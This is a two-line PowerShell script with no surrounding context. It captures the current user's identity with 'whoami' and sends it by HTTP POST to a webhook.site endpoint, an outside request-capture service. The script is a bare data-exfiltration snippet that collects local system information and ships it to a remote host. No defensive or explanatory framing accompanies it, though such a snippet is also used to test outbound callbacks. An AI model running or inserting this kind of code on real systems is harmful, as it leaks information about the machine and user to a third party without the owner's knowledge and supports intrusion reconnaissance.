$info = whoami
Invoke-RestMethod -Uri "https://webhook.site/6c415fe2-e4c4-4b25-a536-3a29351b4f8e" -Method Post -Body $info
